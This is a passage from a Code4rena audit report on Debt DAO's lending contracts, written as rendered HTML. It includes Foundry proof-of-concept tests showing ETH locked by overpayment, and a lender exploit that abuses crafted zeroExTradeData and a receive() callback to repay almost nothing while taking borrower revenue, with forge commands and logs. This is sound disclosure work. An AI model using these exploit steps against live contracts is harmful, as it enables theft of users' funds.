class=\"grvsc-source\">        // fund lender</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deal(lender, amount*5);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // fund borrower</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deal(borrower, amount*5);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // add credit to line</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.addCredit(dRate, fRate, amount, eth, lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //double msg.value then amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.addCredit{value: amount*2}(dRate, fRate, amount, eth, lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //borrow 1 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32 id = line.ids(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.borrow(id, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //depositAndClose full extra funds (amount)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.depositAndClose{value:amount}();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //validate funds are stuck</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assert(address(line).balance == amount*2 - amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function test_freeze_eth_increaseCredit() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount = 1 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // fund lender</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deal(lender, amount*5);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // fund borrower</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deal(borrower, amount*5);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // add credit to line</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _addCreditEth(eth, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // get id</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32 id = line.ids(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // increase credit to line</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.increaseCredit(id, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //double msg.value then amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.increaseCredit{value:amount*2}(id, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //total amount * 3 in contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //borrow 2 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.borrow(id, amount * 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //depositAndClose full extra funds (amount)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.depositAndClose{value:amount*2}();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //validate funds are stuck</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assert(address(line).balance == amount*3 - amount*2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>The POC demonstrates how Borrower and Lender funds get locked in the protocol.</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Options:</p>\n<ol>\n<li>refund - in receiveTokenOrETH, refund tokens back to <code>msg.sender</code>if <code>msg.value > amount</code></li>\n<li>revert - change the expression <code>if(msg.value &#x3C; amount)</code> to <code>if(msg.value != amount)</code> and revert the transaction.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/39#issuecomment-1339519753\">dmvt (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>This has been rated Medium because it requires that the borrower or lender send too much ETH in the first place (external factor). Great report quality!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/39#issuecomment-1405075453\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-04-lender-can-trade-claimtoken-in-a-malicious-way-to-steal-the-borrowers-money-via-claimandrepay-in-spigotedline-by-using-malicious-zeroextradedata\" style=\"position:relative;\"><a href=\"#m-04-lender-can-trade-claimtoken-in-a-malicious-way-to-steal-the-borrowers-money-via-claimandrepay-in-spigotedline-by-using-malicious-zeroextradedata\" aria-label=\"m 04 lender can trade claimtoken in a malicious way to steal the borrowers money via claimandrepay in spigotedline by using malicious zeroextradedata permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/110\">[M-04] Lender can trade claimToken in a malicious way to steal the borrower’s money via <code>claimAndRepay()</code> in SpigotedLine by using malicious zeroExTradeData</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/110\">perseverancesuccess</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/411\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/384\">HE1M</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/363\">minhquanym</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/349\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/274\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/153\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/126\">Lambda</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/88\">aphak5010</a></em></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol#L106-L112\">https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol#L106-L112</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol#L75-L85\">https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol#L75-L85</a></p>\n<h3 id=\"impact-7\" style=\"position:relative;\"><a href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Lender can trade claimToken in a malicious way to steal the borrower’s money via <code>claimAndRepay()</code> in SpigotedLine by using malicious zeroExTradeData.</p>\n<p>In the design of the protocol, the lender can use the function <code>claimAndRepay()</code>, the lender can take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function claimAndRepay(address claimToken, bytes calldata zeroExTradeData) external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        whileBorrowing</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        nonReentrant</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        returns (uint256) { </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// Line 106 - Line 112</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 newTokens = claimToken == credit.token ?</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          spigot.claimEscrow(claimToken) :  // same asset. dont trade</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          _claimAndTrade(                   // trade revenue token for debt obligation</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              claimToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              credit.token,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              zeroExTradeData</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// Line 128 - Line 130 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> credits[id] = _repay(credit, id, repaid);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit RevenuePayment(claimToken, repaid);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _claimAndTrade(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      address claimToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      address targetToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      bytes calldata zeroExTradeData</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        internal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        returns (uint256)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            claimToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            targetToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            swapTarget,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(spigot),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            unusedTokens[claimToken],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            zeroExTradeData</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // we dont use revenue after this so can store now</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unusedTokens[claimToken] = totalUnused;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return tokensBought;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function claimAndTrade(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address claimToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address targetToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address payable swapTarget,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address spigot,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 unused,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata zeroExTradeData</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    external </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        returns(uint256, uint256)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> trade(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            claimed + unused,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            claimToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            swapTarget,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            zeroExTradeData</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // underflow revert ensures we have more tokens than we started with</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>In the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert.</p>\n<p>The bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following code can manipulate and bypass the check to steal money of the borrower.</p>\n<p>Step 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract.</p>\n<p>Step 2: In the exploit contract, have the <code>receive()</code> function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">receive() external payable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 amount = 100; </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    creditToken.transfer(address(line),amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;Receive the amount of ETH: %s&quot;, msg.value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>In the <code>receive()</code> function, the exploit contract transfers some amount of creditToken to the SpigotedLine contract to bypass the check:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"> if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought</span></span></code></pre>\n<p>Since this check requires only not 0, so the lender can send only 1 or very small amount, e.g. 100 of creditToken.</p>\n<p>This amount then will be used to repay the credit.</p>\n<p>So this means, the borrower lost money, because the lender can claim big amount of claimToken and repay a little for the credit.</p>\n<p>In the zip file in the Google_Drive link, there is the POC written for this bug.</p>\n<p>The test case is test<em>lender</em>can<em>claim</em>and<em>repay\\</em>3 in file SpigotedLine.t.modified.sol</p>\n<p>You can put this file to the tests folder\n<a href=\"https://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing\">https://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing</a></p>\n<p>You can run the POC by calling:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url &#39;https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af&#39; --fork-block-n</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">umber 15918000</span></span></code></pre>\n<p>Here I use the block-number to make the test log stable, but this does not impact the logic of POC.</p>\n<p>You can find the detailed log file: Line-of-Credit\\test<em>claim\\</em>221107_2311.log.</p>\n<p>The full log file here: <a href=\"https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing\">https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing</a></p>\n<p>In this log file, the lender claims 1000 DAI (DAI is revenueToken) then sell to receive 0.6324 ETH, but repays only 100 * ( 10 ** -18 ) BUSD for the borrower.</p>\n<p>Logs:</p>\n<p>Step 0: As a Borrower borrow some money</p>\n<p>Step 1: Construct the tradeData to call claimAndRepay as the lender\nclaimed: 1000000000000000000000</p>\n<p>unused: 0</p>\n<p>sellAmount: 1000000000000000000000</p>\n<p>Step 1: As the lender, call claimAndRepay with Malicious zeroExTradeData</p>\n<p>Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance</p>\n<p>Receive the amount of ETH: 632428006785336734\nemit RepayInterest(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 0)</p>\n<p>emit RepayPrincipal(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 100)</p>\n<p>RevenuePayment(token: DAI: [0x6b175474e89094c44da98b954eedeac495271d0f], amount: 100)</p>\n<p>You can use the POC.patch here: <a href=\"https://drive.google.com/file/d/17Ycdi5czBoFOKNQlgVqWxVdHxfw04304/view?usp=sharing\">https://drive.google.com/file/d/17Ycdi5czBoFOKNQlgVqWxVdHxfw04304/view?usp=sharing</a></p>\n<p>To use it use command</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">git apply POC.patch</span></span></code></pre>\n<p>To run use command</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge install</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url &#39;https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af&#39; --fork-block-n</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">umber 15918000</span></span></code></pre>\n<p>The full code repository: <a href=\"https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing\">https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing</a></p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>This is a difficult bug to fix if the protocol still allows the lender to use this functionality. Probably should limit this functionality for the borrower to use. Because the borrower will not benefit from stealing his own money.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/110\">dmvt (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/110#issuecomment-1343293968\">dmvt (judge) commented</a>:</strong></p>\n<blockquote>\n<p>A note on this. <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/411\">#411</a> describes a different vector of the same fundamental attack. It’s likely that the vector in #411 is more likely to occur, but I’m marking this one the best due to the inclusion of a test and descriptive POC. For the final report it should be noted that both the lender and borrower can perform a version of this attack.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/110#issuecomment-1405075073\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-05-reentrancy-bug-allows-lender-to-steal-other-lenders-funds\" style=\"position:relative;\"><a href=\"#m-05-reentrancy-bug-allows-lender-to-steal-other-lenders-funds\" aria-label=\"m 05 reentrancy bug allows lender to steal other lenders funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 